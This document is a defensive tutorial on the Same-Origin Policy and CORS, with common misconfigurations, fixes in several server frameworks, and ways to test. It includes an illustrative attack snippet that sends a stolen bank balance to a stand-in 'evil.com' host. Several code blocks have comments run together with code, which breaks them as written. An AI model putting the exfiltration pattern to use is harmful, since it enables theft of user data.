# CORS and Same-Origin Policy

---

## **Introduction**

### **What is an Origin?**

An **origin** is defined by three components:

1. **Scheme (Protocol)**: `http://` or `https://`
2. **Host (Domain)**: `example.com`
3. **Port**: `80` (HTTP) or `443` (HTTPS) - default ports are implicit

**Examples:**

```
https://example.com:443  → Origin: https://example.com
http://example.com:80   → Origin: http://example.com
https://api.example.com → Origin: https://api.example.com
http://example.com:8080 → Origin: http://example.com:8080

```

**Same Origin Examples:**

```
✅ https://example.com/page1
✅ https://example.com/page2
✅ https://example.com:443/api
// All same origin (port 443 is default for HTTPS)

```

**Different Origin Examples:**

```
❌ http://example.com vs https://example.com
   (Different protocol)

❌ example.com vs www.example.com
   (Different host)

❌ https://example.com vs https://example.com:8080
   (Different port)

❌ https://example.com vs https://api.example.com
   (Different subdomain)

```

### **Why Do We Need SOP and CORS?**

**The Problem:**

- Modern web applications need to access resources from different origins
- APIs are often hosted on different domains
- Third-party services need to integrate
- But we need security to prevent unauthorized access

**The Solution:**

- **SOP**: Default security mechanism (restricts)
- **CORS**: Controlled relaxation (allows specific origins)

---

## **Same-Origin Policy (SOP)**

### **Definition**

The Same-Origin Policy is a **browser security mechanism** that restricts how documents or scripts loaded from one origin can interact with resources from another origin.

### **What SOP Restricts**

**1. JavaScript Access to DOM:**

```jsx
// Same origin - ALLOWED// https://example.com/page1 accessing https://example.com/page2window.open('https://example.com/page2');
// Can access DOM, cookies, localStorage// Different origin - BLOCKED// https://example.com accessing https://evil.comwindow.open('https://evil.com');
// Cannot access DOM, cookies, localStorage
```

**2. AJAX/Fetch Requests:**

```jsx
// Same origin - ALLOWEDfetch('https://example.com/api/data')
  .then(response => response.json())
  .then(data => console.log(data));
// Works fine// Different origin - BLOCKED (unless CORS allows)fetch('https://api.example.com/data')
  .then(response => response.json())
  .then(data => console.log(data));
// CORS error: "No 'Access-Control-Allow-Origin' header"
```

**3. Cookie Access:**

```jsx
// Same origin - Cookies accessibledocument.cookie = "sessionId=abc123";
// Can read/write cookies// Different origin - Cookies NOT accessible// Cookies are origin-specific
```

**4. LocalStorage/SessionStorage:**

```jsx
// Same origin - Storage accessiblelocalStorage.setItem('key', 'value');
// Can read/write storage// Different origin - Storage NOT accessible// Storage is origin-specific
```

### **What SOP Does NOT Restrict**

**1. Embedding Resources:**

```html
<!-- These work across origins --><img src="https://other-domain.com/image.jpg">
<script src="https://cdn.example.com/library.js"></script>
<link rel="stylesheet" href="https://cdn.example.com/style.css">
<iframe src="https://other-domain.com/page.html"></iframe>

```

**2. Form Submissions:**

```html
<!-- Form can submit to different origin --><form action="https://other-domain.com/submit" method="POST">
  <input name="data" value="test">
</form>
<!-- SOP doesn't block this (but CORS might) -->
```

**3. Redirects:**

```jsx
// Redirects work across originswindow.location = 'https://other-domain.com';
// SOP doesn't block this
```

### **Why SOP Exists**

**Security Benefits:**

1. **Prevents XSS attacks** from accessing sensitive data
2. **Prevents cookie theft** from other origins
3. **Prevents unauthorized data access**
4. **Protects user privacy**

**Example Attack Without SOP:**

```jsx
// Attacker's website: evil.com// User is logged into bank.com in another tab// Without SOP, attacker could:fetch('https://bank.com/api/balance')
  .then(response => response.json())
  .then(balance => {
// Steal user's balance!fetch('https://evil.com/steal?balance=' + balance);
  });

```

**With SOP:**

```jsx
// Browser blocks the requestfetch('https://bank.com/api/balance')
  .catch(error => {
// CORS error - request blocked by browserconsole.error('Blocked by SOP');
  });

```

### **SOP Exceptions**

**1. CORS (Cross-Origin Resource Sharing):**

- Server can allow specific origins via CORS headers
- Controlled relaxation of SOP

**2. JSONP (JSON with Padding):**

- Older technique using `<script>` tags
- Limited to GET requests
- Security risks - not recommended

**3. PostMessage API:**

- Secure cross-origin communication
- Requires explicit message passing

**4. CORS Proxy:**

- Server-side proxy to bypass CORS
- Not recommended for production

---

## **Cross-Origin Resource Sharing (CORS)**

### **Definition**

CORS is a mechanism that allows web servers to specify which origins are permitted to access their resources, thereby relaxing the Same-Origin Policy in a controlled manner.

### **How CORS Works**

**Step-by-Step Process:**

1. **Browser sends request with Origin header:**
    
    ```
    GET /api/data HTTP/1.1
    Host: api.example.com
    Origin: https://example.com
    
    ```
    
2. **Server responds with CORS headers:**
    
    ```
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://example.com
    Access-Control-Allow-Methods: GET, POST
    Access-Control-Allow-Headers: Content-Type
    Content-Type: application/json
    
    {"data": "value"}
    
    ```
    
3. **Browser checks CORS headers:**
    - If Origin is allowed → Request proceeds
    - If Origin is not allowed → Request blocked

### **Important: CORS is Browser-Enforced**

**Key Point:**

- CORS is enforced by the **browser**, not the server
- Direct requests (curl, Postman) **bypass CORS**
- CORS only affects browser-based requests

**Example:**

```bash
# Browser request (subject to CORS)# JavaScript in browser:
fetch('https://api.example.com/data')
# Browser checks CORS headers# Direct request (bypasses CORS)
curl https://api.example.com/data
# No CORS check - request goes through
```

---

## **CORS Headers Explained**

### **Request Headers (Sent by Browser)**

### **Origin**

```
Origin: https://example.com

```

- Automatically set by browser
- Cannot be modified by JavaScript
- Indicates the origin of the requesting page

### **Access-Control-Request-Method**

```
Access-Control-Request-Method: POST

```

- Used in preflight requests
- Indicates the HTTP method of the actual request

### **Access-Control-Request-Headers**

```
Access-Control-Request-Headers: X-Custom-Header, Content-Type

```

- Used in preflight requests
- Lists custom headers that will be sent

### **Response Headers (Sent by Server)**

### **Access-Control-Allow-Origin**

```
Access-Control-Allow-Origin: https://example.com

```

- **Most important CORS header**
- Specifies which origin(s) can access the resource
- Can be a specific origin or  (wildcard)

**Examples:**

```
# Allow specific origin
Access-Control-Allow-Origin: https://example.com

# Allow any origin (dangerous with credentials)
Access-Control-Allow-Origin: *

# Multiple origins (NOT directly supported)
# Must use server-side logic to set dynamically

```

**Important:**

- Cannot use multiple origins directly
- Must check Origin header and set dynamically
- Wildcard () cannot be used with credentials

### **Access-Control-Allow-Methods**

```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

```

- Specifies which HTTP methods are allowed
- Used in preflight responses
- Comma-separated list

### **Access-Control-Allow-Headers**

```
Access-Control-Allow-Headers: Content-Type, X-Custom-Header, Authorization

```

- Specifies which request headers are allowed
- Used in preflight responses
- Comma-separated list

### **Access-Control-Allow-Credentials**

```
Access-Control-Allow-Credentials: true

```

- Indicates whether credentials (cookies, auth headers) can be sent
- Must be `true` or omitted (defaults to false)
- **Cannot use wildcard () with credentials**

### **Access-Control-Expose-Headers**

```
Access-Control-Expose-Headers: X-Custom-Header, X-Another-Header

```

- Specifies which response headers can be accessed by JavaScript
- By default, only simple headers are exposed
- Comma-separated list

### **Access-Control-Max-Age**

```
Access-Control-Max-Age: 86400

```

- Specifies how long preflight results can be cached (in seconds)
- Reduces number of preflight requests
- Default is 0 (no caching)

---

## **Simple vs Preflight Requests**

### **Simple Requests**

**Criteria for Simple Request:**

1. Method: GET, POST, or HEAD
2. Headers: Only simple headers allowed:
    - Accept
    - Accept-Language
    - Content-Language
    - Content-Type (with restrictions)
3. Content-Type restrictions:
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`

**Example Simple Request:**

```jsx
// Simple GET requestfetch('https://api.example.com/data')
  .then(response => response.json());

// Simple POST requestfetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'key=value'
});

```

**Flow:**

```
1. Browser sends request directly
2. Server responds with CORS headers
3. Browser checks CORS headers
4. Request proceeds or is blocked

```

### **Preflight Requests**

**When Preflight is Triggered:**

1. Custom headers (e.g., `X-Custom-Header`)
2. Non-simple methods (PUT, DELETE, PATCH)
3. Content-Type other than simple types (e.g., `application/json`)
4. Requests with credentials (if server requires preflight)

**Example Preflight Request:**

```jsx
// This triggers preflightfetch('https://api.example.com/data', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({key: 'value'})
});

```

**Preflight Flow:**

```
1. Browser sends OPTIONS request (preflight)
   OPTIONS /api/data HTTP/1.1
   Origin: https://example.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: Content-Type, X-Custom-Header

2. Server responds to preflight
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://example.com
   Access-Control-Allow-Methods: PUT
   Access-Control-Allow-Headers: Content-Type, X-Custom-Header
   Access-Control-Max-Age: 86400

3. Browser checks preflight response
   - If allowed → Sends actual request
   - If not allowed → Blocks request

4. Actual request is sent (if preflight passed)
   PUT /api/data HTTP/1.1
   Origin: https://example.com
   Content-Type: application/json
   X-Custom-Header: value

```

**Important:**

- Preflight requests are **automatic** (browser handles them)
- You don't need to manually send OPTIONS requests
- Preflight is a **browser optimization** to avoid sending unsafe requests

---

## **CORS with Credentials**

### **What are Credentials?**

Credentials include:

- Cookies
- HTTP Authentication
- Client certificates

### **Enabling Credentials**

**Client-side (JavaScript):**

```jsx
fetch('https://api.example.com/data', {
  credentials: 'include'// or 'same-origin', 'omit'
});

```

**Server-side (Response headers):**

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true

```

### **Critical Rule: No Wildcard with Credentials**

**❌ INVALID (Browsers will reject):**

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

```

**✅ VALID:**

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true

```

**Why:**

- Wildcard with credentials is a security risk
- Browsers enforce this rule
- Must specify exact origin when using credentials

### **Credentials Example**

**Complete Flow:**

```jsx
// Client: example.comfetch('https://api.example.com/data', {
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  }
});

```

```
# Request
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Cookie: sessionId=abc123

# Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Set-Cookie: sessionId=xyz789; HttpOnly; Secure; SameSite=None

{"data": "value"}

```

---

## **Common CORS Vulnerabilities**

### **1. Wildcard with Credentials**

**Vulnerability:**

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

```

**Impact:**

- Browsers should reject this (spec violation)
- But if misconfigured, any origin can access with credentials
- Sensitive data exposure

**Fix:**

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true

```

### **2. Origin Reflection Without Validation**

**Vulnerability:**

```jsx
// Server blindly reflects Origin header
app.use((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
});

```

**Attack:**

```bash
# Attacker sends request with malicious origin
curl -H "Origin: https://evil.com" https://api.example.com/data

# Server reflects it
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

```

**Fix:**

```jsx
const allowedOrigins = ['https://example.com', 'https://app.example.com'];

app.use((req, res) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
});

```

### **3. Overly Permissive Methods**

**Vulnerability:**

```
Access-Control-Allow-Methods: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE, CONNECT

```

**Impact:**

- Allows unnecessary HTTP methods
- Increases attack surface

**Fix:**

```
Access-Control-Allow-Methods: GET, POST
# Only allow methods you actually use

```

### **4. Overly Permissive Headers**

**Vulnerability:**

```
Access-Control-Allow-Headers: *
Access-Control-Allow-Headers: *

```

**Impact:**

- Allows any custom headers
- May bypass security controls

**Fix:**

```
Access-Control-Allow-Headers: Content-Type, Authorization
# Only allow headers you actually need

```

### **5. Missing Preflight Validation**

**Vulnerability:**

```jsx
// Server doesn't validate preflight properly
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', '*');
  res.end();
});

```

**Impact:**

- Allows any origin to make any request
- Bypasses security controls

**Fix:**

```jsx
const allowedOrigins = ['https://example.com'];

app.options('*', (req, res) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  }
  res.end();
});

```

### **6. Subdomain Wildcard Abuse**

**Vulnerability:**

```jsx
// Allows any subdomainconst origin = req.headers.origin;
if (origin && origin.endsWith('.example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}

```

**Attack:**

```bash
# Attacker registers evil.example.com# Gets access to API
```

**Fix:**

```jsx
const allowedOrigins = [
  'https://example.com',
  'https://app.example.com',
  'https://api.example.com'
];

const origin = req.headers.origin;
if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}

```

---

## **Secure CORS Implementation**

### **Node.js/Express**

**Basic Implementation:**

```jsx
const express = require('express');
const app = express();

const allowedOrigins = [
  'https://example.com',
  'https://app.example.com'
];

// CORS middleware
app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

// Handle preflightif (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');
    return res.sendStatus(200);
  }

  next();
});

app.get('/api/data', (req, res) => {
  res.json({ data: 'value' });
});

```

**Using cors middleware:**

```jsx
const express = require('express');
const cors = require('cors');
const app = express();

const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://example.com',
      'https://app.example.com'
    ];

    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400
};

app.use(cors(corsOptions));

app.get('/api/data', (req, res) => {
  res.json({ data: 'value' });
});

```

### **Python/Flask**

```python
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)

# Configure CORS
cors = CORS(app, resources={
    r"/api/*": {
        "origins": ["https://example.com", "https://app.example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True,
        "max_age": 86400
    }
})

@app.route('/api/data')
def get_data():
    return jsonify({'data': 'value'})

```

### **Python/Flask (Manual Implementation)**

```python
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

ALLOWED_ORIGINS = [
    'https://example.com',
    'https://app.example.com'
]

@app.after_request
def after_request(response):
    origin = request.headers.get('Origin')

    if origin and origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response.headers['Access-Control-Max-Age'] = '86400'

# Handle preflightif request.method == 'OPTIONS':
        return response

    return response

@app.route('/api/data')
def get_data():
    return jsonify({'data': 'value'})

```

### **PHP**

```php
<?php
$allowedOrigins = [
    'https://example.com',
    'https://app.example.com'
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowedOrigins)) {
    header("Access-Control-Allow-Origin: $origin");
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
    header('Access-Control-Allow-Headers: Content-Type, Authorization');
    header('Access-Control-Max-Age: 86400');
}

// Handle preflightif ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Your API codeheader('Content-Type: application/json');
echo json_encode(['data' => 'value']);
?>

```

### **Java/Spring Boot**

```java
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class CorsConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://example.com", "https://app.example.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Content-Type", "Authorization")
            .allowCredentials(true)
            .maxAge(86400);
    }
}

@RestController
@RequestMapping("/api")
public class ApiController {

    @GetMapping("/data")
    public ResponseEntity<?> getData() {
        return ResponseEntity.ok(Map.of("data", "value"));
    }
}

```

### **C#/ASP.NET Core**

```csharp
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;

public class Startup
{
    public void ConfigureServices(IServiceCollection services)
    {
        services.AddCors(options =>
        {
            options.AddPolicy("AllowSpecificOrigins", policy =>
            {
                policy.WithOrigins("https://example.com", "https://app.example.com")
                      .AllowCredentials()
                      .AllowAnyMethod()
                      .AllowAnyHeader()
                      .SetPreflightMaxAge(TimeSpan.FromDays(1));
            });
        });
    }

    public void Configure(IApplicationBuilder app)
    {
        app.UseCors("AllowSpecificOrigins");
// ... other middleware
    }
}

[ApiController]
[Route("api")]
public class ApiController : ControllerBase
{
    [HttpGet("data")]
    public IActionResult GetData()
    {
        return Ok(new { data = "value" });
    }
}

```

### **Nginx Configuration**

```
server {
    listen 443 ssl;
    server_name api.example.com;

    location /api {
# CORS headersif ($http_origin ~* ^https://(example|app)\.example\.com$) {
            add_header 'Access-Control-Allow-Origin' '$http_origin' always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;
            add_header 'Access-Control-Max-Age' '86400' always;
        }

# Handle preflightif ($request_method = 'OPTIONS') {
            return 204;
        }

        proxy_pass http://backend;
    }
}

```

---

## **Testing CORS Configuration**

### **Manual Testing with curl**

**Test simple request:**

```bash
curl -H "Origin: https://example.com" \
     -H "Access-Control-Request-Method: GET" \
     -v https://api.example.com/data

```

**Test preflight:**

```bash
curl -X OPTIONS \
     -H "Origin: https://example.com" \
     -H "Access-Control-Request-Method: POST" \
     -H "Access-Control-Request-Headers: Content-Type" \
     -v https://api.example.com/data

```

**Test with credentials:**

```bash
curl -H "Origin: https://example.com" \
     -H "Cookie: sessionId=abc123" \
     -v https://api.example.com/data

```

### **Browser Testing**

**JavaScript Console:**

```jsx
// Test simple requestfetch('https://api.example.com/data', {
  credentials: 'include'
})
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('CORS error:', error));

// Test preflightfetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({key: 'value'})
})
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('CORS error:', error));

```

**Browser DevTools:**

1. Open Network tab
2. Make request
3. Check request headers (Origin)
4. Check response headers (CORS headers)
5. Look for CORS errors in console

### **Automated Testing Tools**

**CORScanner:**

```bash
git clone https://github.com/chenjj/CORScanner
cd CORScanner
python CORScanner.py -u https://api.example.com

```

**Burp Suite:**

1. Configure proxy
2. Intercept request
3. Modify Origin header
4. Check response headers

**OWASP ZAP:**

- Automated CORS scanning
- Identifies misconfigurations

---

## **Real-World Scenarios**

### **Scenario 1: Public API (No Credentials)**

**Requirements:**

- Public API accessible from any origin
- No authentication required
- Read-only data

**Configuration:**

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET

```

**Note:** Wildcard is acceptable for truly public APIs without credentials.

### **Scenario 2: Authenticated API (With Credentials)**

**Requirements:**

- API requires authentication
- Cookies or tokens sent with requests
- Specific origins only

**Configuration:**

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization

```

**Client:**

```jsx
fetch('https://api.example.com/data', {
  credentials: 'include',
  headers: {
    'Authorization': 'Bearer token123'
  }
});

```

### **Scenario 3: Multi-Origin Support**

**Requirements:**

- Support multiple trusted origins
- Dynamic origin validation
- Credentials enabled

**Configuration:**

```jsx
const allowedOrigins = [
  'https://example.com',
  'https://app.example.com',
  'https://admin.example.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  next();
});

```

### **Scenario 4: Development vs Production**

**Requirements:**

- Different CORS settings for dev/prod
- Local development support
- Production restrictions

**Configuration:**

```jsx
const isDevelopment = process.env.NODE_ENV === 'development';

const corsOptions = {
  origin: (origin, callback) => {
    if (isDevelopment) {
// Allow localhost in developmentif (!origin || origin.startsWith('http://localhost')) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed'));
      }
    } else {
// Production: strict origin listconst allowedOrigins = [
        'https://example.com',
        'https://app.example.com'
      ];

      if (allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed'));
      }
    }
  },
  credentials: true
};

```

### **Scenario 5: Third-Party Widget Integration**

**Requirements:**

- Widget embedded on third-party sites
- Needs to communicate with your API
- Secure communication

**Configuration:**

```
Access-Control-Allow-Origin: https://widget.example.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST

```

**Alternative:** Use postMessage API for better security.

---

## **Summary**

### **Key Takeaways**

1. **SOP restricts, CORS allows**
    - SOP is the default security mechanism
    - CORS is the controlled relaxation
2. **CORS is browser-enforced**
    - Direct requests bypass CORS
    - Only affects browser requests
3. **Always validate Origin header**
    - Don't blindly reflect Origin
    - Use whitelist of allowed origins
4. **Never use wildcard with credentials**
    - `Access-Control-Allow-Origin: *` + credentials = invalid
    - Browsers should reject, but don't rely on it
5. **Implement proper preflight handling**
    - Validate methods and headers
    - Use appropriate Max-Age
6. **Test your CORS configuration**
    - Manual testing with curl
    - Browser testing
    - Automated scanning tools

### **Best Practices**

✅ **Do:**

- Use specific origins (whitelist)
- Validate Origin header server-side
- Limit allowed methods and headers
- Use credentials only when necessary
- Test CORS configuration thoroughly

❌ **Don't:**

- Use wildcard with credentials
- Blindly reflect Origin header
- Allow unnecessary methods/headers
- Skip preflight validation
- Rely on CORS for server security

### **Remember**

- **SOP** = Browser security (restricts)
- **CORS** = Controlled relaxation (allows)
- **CORS headers** = Server tells browser what to allow
- **Browser** = Enforces CORS based on server headers
- **Direct requests** = Bypass CORS entirely

---

## **Next Steps**

- Review `02_INTERVIEW_QUESTIONS.md` for practice
- Check `03_QUICK_REFERENCE.md` for quick lookup
- Test CORS configuration in your applications